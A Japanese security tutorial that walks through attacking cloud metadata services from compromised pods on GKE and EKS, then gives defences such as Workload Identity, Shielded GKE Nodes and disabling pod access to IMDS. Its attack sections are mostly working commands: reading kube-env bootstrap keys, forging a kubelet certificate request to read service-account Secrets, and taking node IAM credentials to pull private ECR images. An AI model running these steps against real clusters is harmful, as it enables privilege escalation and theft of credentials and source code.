# Metadata Service へのアクセス

GCP や AWS などのクラウドプロバイダーには Metadata Service と呼ばれるインスタンスに対して任意のデータを提供するエンドポイントがあり、インスタンスから http://169.254.169.254/ にアクセスすることで取得できます。  
GKE や EKS などのマネージド Kubernetes も例外ではなく、適切なアクセス制御を施さなければ Pod から Metadata Service にアクセスすることができ、権限昇格へとつながる可能性があります。  
ここでは GKE / EKS でこれらのエンドポイントにアクセスできた場合の攻撃例と対策を紹介します。

## GKE

GKE の Metadata Service に含まれる `kube-env` という Metadata にはノードをクラスタにジョインさせるために必要な bootstrap 処理に使用されるクレデンシャル(CA 証明書と公開,秘密鍵)が格納されています。  
これを利用して CertificateSigningRequest を作成することで kubelet のクライアント証明書を取得できます。さらに、その取得した証明書を使って kubelet として API サーバーにリクエストを送信することができてしまうのです。

これは GKE のコントロールプレーンとノードの認証方法に関するドキュメントに記載されています。[^1]

> Each node in the cluster is injected with a shared Secret at creation, which it can use to submit certificate signing requests to the cluster root CA and obtain kubelet client certificates. These certificates are then used by the kubelet to authenticate its requests to the API server. Note that this shared Secret is reachable by Pods, unless metadata concealment is enabled.

それでは実際に試していきます。GKE でクラスタを作成し、Pod に入ったあと、まずは Metadata へのアクセスを確認します。

```shell
root@test:/# KUBE_ENV_URL="http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env"
root@test:/# curl -s -H "Metadata-flavor: Google" "${KUBE_ENV_URL}"
ALLOCATE_NODE_CIDRS: "true"
API_SERVER_TEST_LOG_LEVEL: --v=3
AUTOSCALER_ENV_VARS: kube_reserved=cpu=60m,memory=960Mi,ephemeral-storage=5Gi;node_labels=beta.kubernetes.io/fluentd-ds-ready=true,cloud.google.com/gke-nodepool=default-pool,cloud.google.com/gke-os-distribution=cos
CA_CERT: LS0tLS1CRUdJ...S0tLS0tCg==
CLUSTER_IP_RANGE: 10.0.0.0/14
CLUSTER_NAME: sandbox-cluster
CNI_SHA1: dcbeba8d6be7a49e399bda6b8b638d312eace876
CNI_STORAGE_PATH: https://storage.googleapis.com/gke-release/cni-plugins/v0.8.5-gke.1
CNI_STORAGE_URL_BASE: https://storage.googleapis.com/gke-release/cni-plugins
CNI_TAR_PREFIX: cni-plugins-linux-amd64-
CNI_VERSION: v0.8.5-gke.1
CREATE_BOOTSTRAP_KUBECONFIG: "true"
DNS_DOMAIN: cluster.local
DNS_SERVER_IP: 10.3.240.10
DOCKER_REGISTRY_MIRROR_URL: https://mirror.gcr.io
ELASTICSEARCH_LOGGING_REPLICAS: "1"
ENABLE_CLUSTER_DNS: "true"
ENABLE_CLUSTER_LOGGING: "false"
ENABLE_CLUSTER_MONITORING: none
ENABLE_CLUSTER_REGISTRY: "false"
ENABLE_CLUSTER_UI: "true"
ENABLE_L7_LOADBALANCING: glbc
ENABLE_METADATA_AGENT: ""
ENABLE_METRICS_SERVER: "true"
ENABLE_NODE_LOGGING: "false"
ENABLE_NODE_PROBLEM_DETECTOR: standalone
ENABLE_NODELOCAL_DNS: "false"
ENABLE_SYSCTL_TUNING: "true"
ENV_TIMESTAMP: "2020-09-10T02:20:16+00:00"
EXTRA_DOCKER_OPTS: --insecure-registry 10.0.0.0/8
FEATURE_GATES: DynamicKubeletConfig=false,TaintBasedEvictions=false,RotateKubeletServerCertificate=true,ExperimentalCriticalPodAnnotation=true
FLUENTD_CONTAINER_RUNTIME_SERVICE: containerd
HEAPSTER_USE_NEW_STACKDRIVER_RESOURCES: "true"
HEAPSTER_USE_OLD_STACKDRIVER_RESOURCES: "false"
HPA_USE_REST_CLIENTS: "true"
INSTANCE_PREFIX: gke-sandbox-cluster-e2749290
KUBE_ADDON_REGISTRY: k8s.gcr.io
KUBE_CLUSTER_DNS: 10.3.240.10
KUBE_DOCKER_REGISTRY: gke.gcr.io
KUBE_MANIFESTS_TAR_HASH: d669659b3716794bafc85a1808d5def16e536166
KUBE_MANIFESTS_TAR_URL: https://storage.googleapis.com/gke-release-asia/kubernetes/release/v1.15.12-gke.2/kubernetes-manifests.tar.gz,https://storage.googleapis.com/gke-release/kubernetes/release/v1.15.12-gke.2/kubernetes-manifests.tar.gz,https://storage.googleapis.com/gke-release-eu/kubernetes/release/v1.15.12-gke.2/kubernetes-manifests.tar.gz
KUBE_PROXY_TOKEN: SrS1RF7V6Te5rd95FYvBhTEN04hWTKp2X4nMoxBrFgY=
KUBELET_ARGS: --v=2 --cloud-provider=gce --experimental-check-node-capabilities-before-mount=true
  --experimental-mounter-path=/home/kubernetes/containerized_mounter/mounter --cert-dir=/var/lib/kubelet/pki/
  --cni-bin-dir=/home/kubernetes/bin --kubeconfig=/var/lib/kubelet/kubeconfig --image-pull-progress-deadline=5m
  --experimental-kernel-memcg-notification=true --max-pods=110 --non-masquerade-cidr=0.0.0.0/0
  --network-plugin=kubenet --node-labels=beta.kubernetes.io/fluentd-ds-ready=true,cloud.google.com/gke-nodepool=default-pool,cloud.google.com/gke-os-distribution=cos
  --volume-plugin-dir=/home/kubernetes/flexvolume --bootstrap-kubeconfig=/var/lib/kubelet/bootstrap-kubeconfig
  --node-status-max-images=25 --registry-qps=10 --registry-burst=20
KUBELET_CERT: LS0tLS1CR...tLS0tCg==
KUBELET_KEY: LS0tLS1CRUdJT...tFWS0tLS0tCg==
KUBERNETES_MASTER: "false"
KUBERNETES_MASTER_NAME: 35.200.103.159
LOGGING_DESTINATION: ""
LOGGING_STACKDRIVER_RESOURCE_TYPES: ""
MONITORING_FLAG_SET: "true"
NETWORK_PROVIDER: kubenet
NODE_LOCAL_SSDS_EXT: ""
NODE_PROBLEM_DETECTOR_TOKEN: etn...zY=
NON_MASQUERADE_CIDR: 0.0.0.0/0
REMOUNT_VOLUME_PLUGIN_DIR: "true"
REQUIRE_METADATA_KUBELET_CONFIG_FILE: "true"
SALT_TAR_HASH: ""
SALT_TAR_URL: https://storage.googleapis.com/gke-release-asia/kubernetes/release/v1.15.12-gke.2/kubernetes-salt.tar.gz,https://storage.googleapis.com/gke-release/kubernetes/release/v1.15.12-gke.2/kubernetes-salt.tar.gz,https://storage.googleapis.com/gke-release-eu/kubernetes/release/v1.15.12-gke.2/kubernetes-salt.tar.gz
SERVER_BINARY_TAR_HASH: a016a715584cc797c4d9c2c3c8ae34d0fb3837db
SERVER_BINARY_TAR_URL: https://storage.googleapis.com/gke-release-asia/kubernetes/release/v1.15.12-gke.2/kubernetes-server-linux-amd64.tar.gz,https://storage.googleapis.com/gke-release/kubernetes/release/v1.15.12-gke.2/kubernetes-server-linux-amd64.tar.gz,https://storage.googleapis.com/gke-release-eu/kubernetes/release/v1.15.12-gke.2/kubernetes-server-linux-amd64.tar.gz
SERVICE_CLUSTER_IP_RANGE: 10.3.240.0/20
STACKDRIVER_ENDPOINT: https://logging.googleapis.com
SYSCTL_OVERRIDES: ""
VOLUME_PLUGIN_DIR: /home/kubernetes/flexvolume
ZONE: asia-northeast1-b
```

様々なデータが含まれていることが確認できます。ここに含まれている `CA_CERT` , `KUBELET_CERT` , `KUBELET_KEY` がそれぞれ証明書の生成に必要なファイルです。  
これらは base64 エンコードされているため、デコードして保存します。

```shell
root@test:/# curl -s -H "Metadata-flavor: Google" "${KUBE_ENV_URL}" | grep -v "EVICTION" | grep -v "KUBELET_TEST_ARGS" | grep -v "EXTRA_DOCKER_OPTS" | sed -e 's/: /=/g' > env
root@test:/# source ./env

root@test:/# echo $CA_CERT | base64 -d > bootstrap/ca.crt
root@test:/# echo $KUBELET_CERT | base64 -d > bootstrap/kubelet-bootstrap.crt
root@test:/# echo $KUBELET_KEY | base64 -d > bootstrap/kubelet-bootstrap.key
```

Pod が配置されている Node のホスト名も取得します。

```shell
root@test:/# KUBE_HOSTNAME_URL="http://169.254.169.254/computeMetadata/v1/instance/hostname"
root@test:/# CURRENT_HOSTNAME="$(curl -s -H 'Metadata-flavor: Google' ${KUBE_HOSTNAME_URL} | awk -F. '{print $1}')"
root@test:/# echo $CURRENT_HOSTNAME
gke-sandbox-cluster-default-pool-f9270e72-mg63
```

これからの操作を簡単にするために `kubectl` も取得しておきましょう。

```shell
root@test:/# curl -s -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
root@test:/# chmod +x kubectl
```

取得した証明書を使って Node のホスト名を含んだ CSR を作成します。

```shell
root@test:/tmp# cat openssl.cnf
[ req ]
prompt = no
encrypt_key = no
default_md = sha256
distinguished_name = dname
[ dname ]
O = system:nodes
CN = system:node:gke-sandbox-cluster-default-pool-f9270e72-mg63

root@test:/tmp# openssl ecparam -genkey -name prime256v1 -out kubelet.key
root@test:/tmp# openssl req -new -config /tmp/openssl.cnf -key kubelet.key -out kubelet.csr
```

CertificateSigningRequest リソースを作ります。 `request` には生成した CSR を base64 エンコードした値を指定します。

```shell
root@test:/tmp# cat kubelet.csr | base64 | tr -d '\n'
LS0tLS1CRUdJ...LS0tLS0K

root@test:/# cat /tmp/kubelet.yaml
apiVersion: certificates.k8s.io/v1beta1
kind: CertificateSigningRequest
metadata:
  name: node-csr-gke-sandbox-cluster-default-pool-f9270e72-mg63-2
spec:
  groups:
  - system:authenticated
  request: LS0tLS1CRUdJ...LS0tLS0K
  usages:
  - digital signature
  - key encipherment
  - client auth
  username: kubelet
```

CertificateSigningRequest を作成すると kube-controoler-manager によって自動承認されます。[^2]

```shell
root@test:/# ./kubectl create -f /tmp/kubelet.yaml --certificate-authority=bootstrap/ca.crt --server=https://$KUBERNETES_MASTER_NAME --client-certificate=bootstrap/kubelet-bootstrap.crt --client-key=bootstrap/kubelet-bootstrap.key
certificatesigningrequest.certificates.k8s.io/node-csr-gke-sandbox-cluster-default-pool-f9270e72-mg63-2 created
```

証明書が承認されたので、クライアント証明書を取得します。

```shell
root@test:/# ./kubectl --certificate-authority=bootstrap/ca.crt --server=https://$KUBERNETES_MASTER_NAME --client-certificate=bootstrap/kubelet-bootstrap.crt --client-key=bootstrap/kubelet-bootstrap.key get csr
NAME                                                        AGE   REQUESTOR                                                    CONDITION
csr-tsfx7                                                   37m   system:node:gke-sandbox-cluster-default-pool-f9270e72-mg63   Approved,Issued
node-csr-P4UgPH1KuYujxgQkDUWU1cWtUcMlEBXl5kn0WqUxS3Y        37m   kubelet                                                      Approved,Issued
node-csr-gke-sandbox-cluster-default-pool-f9270e72-mg63-2   66s   kubelet                                                      Approved,Issued

root@test:/# ./kubectl --certificate-authority=bootstrap/ca.crt --server=https://$KUBERNETES_MASTER_NAME --client-certificate=bootstrap/kubelet-bootstrap.crt --client-key=bootstrap/kubelet-bootstrap.key get csr node-csr-gke-sandbox-cluster-default-pool-f9270e72-mg63-2 -o jsonpath='{.status.certificate}' | base64 -d > /tmp/kubelet.crt
```

これで Pod の一覧と、その Pod で使われている Secret を閲覧できるようになります。Secret の一覧はできませんが、Get はできるので Pod で利用中の Secret は取得することが可能です。

```shell
root@test:/# ./kubectl --certificate-authority=bootstrap/ca.crt --server=https://$KUBERNETES_MASTER_NAME --client-certificate=/tmp/kubelet.crt --client-key=/tmp/kubelet.key get pods
NAME   READY   STATUS    RESTARTS   AGE
test   1/1     Running   0          40m

root@test:/# ./kubectl --certificate-authority=bootstrap/ca.crt --server=https://$KUBERNETES_MASTER_NAME --client-certificate=/tmp/kubelet.crt --client-key=/tmp/kubelet.key get pods --all-namespaces -o=jsonpath='{range .items[*]}{.metadata.namespace}{"|"}{.metadata.name}{"|"}{.spec.volumes[*].secret.secretName}{"\n"}{end}'
default|test|default-token-xjxn2
kube-system|event-exporter-v0.3.0-5cd6ccb7f7-d6vnv|event-exporter-sa-token-t4jdk
kube-system|fluentd-gcp-scaler-6855f55bcc-kck48|fluentd-gcp-scaler-token-s767f
kube-system|fluentd-gcp-v3.1.1-zg5bc|fluentd-gcp-token-qlljh
kube-system|heapster-gke-858f6d47db-jmdm8|heapster-token-l47xx
kube-system|kube-dns-5c446b66bd-xbmn2|kube-dns-token-fx6l4
kube-system|kube-dns-autoscaler-6b7f784798-9q2mq|kube-dns-autoscaler-token-r5xl4
kube-system|kube-proxy-gke-sandbox-cluster-default-pool-f9270e72-mg63|
kube-system|l7-default-backend-84c9fcfbb-97tsn|default-token-psndk
kube-system|metrics-server-v0.3.3-fdc67d4b6-wglqz|metrics-server-token-d74js
kube-system|prometheus-to-sd-q7s2f|prometheus-to-sd-token-876dc
kube-system|stackdriver-metadata-agent-cluster-level-7df5d5fb48-v9l8w|metadata-agent-token-vnpdq

root@test:/# ./kubectl --certificate-authority=bootstrap/ca.crt --server=https://$KUBERNETES_MASTER_NAME --client-certificate=/tmp/kubelet.crt --client-key=/tmp/kubelet.key get secret -n kube-system prometheus-to-sd-token-876dc -o yaml
apiVersion: v1
data:
  ca.crt: LS0t...==
  namespace: a3ViZS1zeXN0ZW0=
  token: ZXlKXa...==
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: prometheus-to-sd
    kubernetes.io/service-account.uid: c3ed5b36-685f-4f6e-93b9-4459a1a251d1
  creationTimestamp: "2020-09-10T02:23:40Z"
  name: prometheus-to-sd-token-876dc
  namespace: kube-system
  resourceVersion: "365"
  selfLink: /api/v1/namespaces/kube-system/secrets/prometheus-to-sd-token-876dc
  uid: 8651c53d-60d3-419c-877c-fef4e399e242
type: kubernetes.io/service-account-token
```

このように、もし Pod が侵害され、Metadata Service へのアクセスが可能だった場合は、Secret へのアクセスもできてしまうため、さらなる権限昇格が可能になります。  
GKE ではこのような攻撃を防ぐために Workload Identity[^3] や Shielded GKE Nodes[^4] という仕組みがありますので、これらを利用することを推奨します。

## EKS

続いて EKS での Metadata Service を見ていきます。AWS での Metadata Service は Amazon EC2 Instance metadata service (IMDS) という名前があるため、ここでも IMDS と表記します。  
まずは `eksctl` でクラスタを作成します。

```shell
$ eksctl create cluster --nodes 1 --name test-cluster --node-type t3.large
...
$ kubectl get nodes
NAME                                                STATUS   ROLES    AGE     VERSION
ip-192-168-74-107.ap-northeast-1.compute.internal   Ready    <none>   2m51s   v1.17.12-eks-7684af
```

クラスタができたら Pod を作成し、IMDS にアクセスしてみます。

```shell
$ kubectl run --image=nicolaka/netshoot:latest --rm -it test bash
If you don't see a command prompt, try pressing enter.
bash-5.0# curl http://169.254.169.254/latest/meta-data/
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
```

GCP とはまた違ったデータが含まれていることが確認できます。このように、クラウドプロバイダーごとに格納されている値は異なるため、利用しているクラウドプロバイダーでどのような値を持っているかを確認し、もしアクセスされた場合にどのような影響が生じるのかを把握することをオススメします。

さて、これらのデータの中で攻撃に利用できるものの一つに Node のインスタンスに紐付いている IAM ロール IAM があります。今回作成したクラスタには `eksctl-test-cluster-nodegroup-ng-NodeInstanceRole-1T2SSTC513WI5` という名前の IAM ロールが付与されていることが確認できます。また、クレデンシャルも取得することもできます。

```shell
bash-5.0# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
eksctl-test-cluster-nodegroup-ng-NodeInstanceRole-1T2SSTC513WI5

bash-5.0# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-test-cluster-nodegroup-ng-NodeInstanceRole-1T2SSTC513WI5/
{
  "Code" : "Success",
  "LastUpdated" : "2020-11-23T13:32:29Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...6GVD",
  "SecretAccessKey" : "MgZ0...Rv1A",
  "Token" : "IQoJb3JpZ...QKjFmg==",
  "Expiration" : "2020-11-23T20:06:44Z"
}
```

この IAM ロールには以下のポリシーが適用されています。

- AmazonEKSWorkerNodePolicy
- AmazonEC2ContainerRegistryReadOnly
- AmazonEKS_CNI_Policy

このポリシーには `ec2:DescribeInstances` や `ec2:DescribeVpcs` などもあり、インスタンスやネットワーク情報の取得などが可能なことがわかります。  
さらに興味深いのは `AmazonEC2ContainerRegistryReadOnly` です。これは ECR から任意の Docker イメージを取得することができます。任意の Docker イメージを取得できるということはアプリケーションのソースコードなどを取得できるということになります。

では試してみましょう。Pod に `aws` コマンドをインストールし、 `aws ecr` コマンドを通してリポジトリの情報を取得できます。

```shell
root@test:~# export AWS_ACCESS_KEY_ID=ASIA...6GVD
root@test:~# export AWS_SECRET_ACCESS_KEY=MgZ0...Rv1A
root@test:~# export AWS_SESSION_TOKEN=IQoJb3JpZ...QKjFmg==

root@test:~# aws ecr describe-repositories
{
    "repositories": [
        {
            "repositoryArn": "arn:aws:ecr:ap-northeast-1:926292163423:repository/mrtc0/test",
            "registryId": "926292163423",
            "repositoryName": "mrtc0/test",
            "repositoryUri": "926292163423.dkr.ecr.ap-northeast-1.amazonaws.com/mrtc0/test",
            "createdAt": "2020-11-23T22:51:31+09:00",
            "imageTagMutability": "MUTABLE",
            "imageScanningConfiguration": {
                "scanOnPush": false
            },
            "encryptionConfiguration": {
                "encryptionType": "AES256"
            }
        }
    ]
}

root@test:~# aws ecr list-images --repository-name mrtc0/test
{
    "imageIds": [
        {
            "imageDigest": "sha256:f9fc7e015619f2460609f17fe5903d698db775a340e4554c8a5b1c65d63b53b1",
            "imageTag": "latest"
        }
    ]
}
```

また、レジストリへのログインパスワードも取得できます。

```shell
root@test:~# aws ecr get-login-password --region ap-northeast-1
eyJwYXlsb2FkIjoiZlB4Qy9KdXFqajE5ZlRkektKZ1liaWlJW...

root@test:~# aws ecr get-login-password --region ap-northeast-1 | docker login --username AWS --password-stdin 926292163423.dkr.ecr.ap-northeast-1.amazonaws.com/mrtc0/test
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

ログインができるのでイメージを取得してみます。`docker` コマンドを用意しなくても `curl` でイメージレイヤを取得することができます。

```shell
root@test:~# export TOKEN=$(aws ecr get-login-password --region ap-northeast-1)
root@test:~# curl -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' -k --user AWS:$TOKEN https://926292163423.dkr.ecr.ap-northeast-1.amazonaws.com/v2/mrtc0/test/manifests/latest
{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {
      "mediaType": "application/vnd.docker.container.image.v1+json",
      "size": 1728,
      "digest": "sha256:0a8054f3ec507e056e6bc0a015d3a85678e4966cd9e1f18953311676ddf681fd"
   },
   "layers": [
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 2797541,
         "digest": "sha256:df20fa9351a15782c64e6dddb2d4a6f50bf6d3688060a34c4014b0d9a752eb4c"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 117,
         "digest": "sha256:a34b0c316d63ed56e3cc1a312826765097c78c747445fad0e14d82686cb5563a"
      }
   ]
}

root@test:~# curl -L -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' -k --user AWS:$TOKEN https://926292163423.dkr.ecr.ap-northeast-1.amazonaws.com/v2/mrtc0/test/blE_ID/  | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   127  100   127    0     0   2116      0 --:--:-- --:--:-- --:--:--  2116
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  1728  100  1728    0     0  12083      0 --:--:-- --:--:-- --:--:-- 12083
{
  "architecture": "amd64",
  "config": {
    "Hostname": "",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sh"
    ],
    "ArgsEscaped": true,
    "Image": "sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
    "Volumes": null,
    "WorkingDir": "",
    "Entrypoint": null,
    "OnBuild": null,
    "Labels": null
  },
  "container_config": {
    "Hostname": "",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sh",
      "-c",
      "#(nop) ADD file:d579202c9c7308a756eac66a2b3be41424e5e92a6376dd3fcf059d57770aa10c in /secret.txt "
    ],
    "ArgsEscaped": true,
    "Image": "sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
    "Volumes": null,
    "WorkingDir": "",
    "Entrypoint": null,
    "OnBuild": null,
    "Labels": null
  },
  "created": "2020-11-23T13:50:04.0959713Z",
  "docker_version": "19.03.13",
  "history": [
    {
      "created": "2020-05-29T21:19:46.192045972Z",
      "created_by": "/bin/sh -c #(nop) ADD file:c92c248239f8c7b9b3c067650954815f391b7bcb09023f984972c082ace2a8d0 in / "
    },
    {
      "created": "2020-05-29T21:19:46.363518345Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"/bin/sh\"]",
      "empty_layer": true
    },
    {
      "created": "2020-11-23T13:50:04.0959713Z",
      "created_by": "/bin/sh -c #(nop) ADD file:d579202c9c7308a756eac66a2b3be41424e5e92a6376dd3fcf059d57770aa10c in /secret.txt "
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:50644c29ef5a27c9a40c393a73ece2479de78325cae7d762ef3cdc19bf42dd0a",
      "sha256:0e93ab7e92aa71e6ad2e6227fc001d8311e4c7827ef882bfe0fadffcfdf8b3e0"
    ]
  }
}

root@test:~# curl -L -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' -k --user AWS:$TOKEN https://926292163423.dkr.ecr.ap-northeast-1.amazonaws.com/v2/mrtc0/test/blobs/sha256:a34b0c316d63ed56e3cc1a312826765097c78c747445fad0e14d82686cb5563a -o layer.tar.gz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   117  100   117    0     0    873      0 --:--:-- --:--:-- --:--:--   873
root@test:~# tar xvzf layer.tar.gz
secret.txt
root@test:~# cat secret.txt
this is secret
```

EKS でもこのような攻撃を防ぐために hostNetwork を利用しないコンテナが IMDS に接続しないように設定できます。[^5]  
カスタム Launch template を使っているか、Self-managed かどうかなどで設定方法が変わってきますが、今回の場合だと `eksctl create nodegroup` でノードグループを作成する際に、 `--disable-pod-imds` フラグを付与することでアクセスを禁止することができます。  
禁止すると次のように 401 が返ってくるようになります。

```shell
bash-5.0# curl -i http://169.254.169.254/
HTTP/1.1 401 Unauthorized
Content-Length: 0
Date: Mon, 23 Nov 2020 14:50:10 GMT
Server: EC2ws
Connection: close
Content-Type: text/plain
```

---

[^1]: https://cloud.google.com/kubernetes-engine/docs/concepts/cluster-trust
[^2]: https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#kubernetes-signers
[^3]: https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity
[^4]: https://cloud.google.com/kubernetes-engine/docs/how-to/shielded-gke-nodes
[^5]: https://docs.aws.amazon.com/eks/latest/userguide/best-practices-security.html
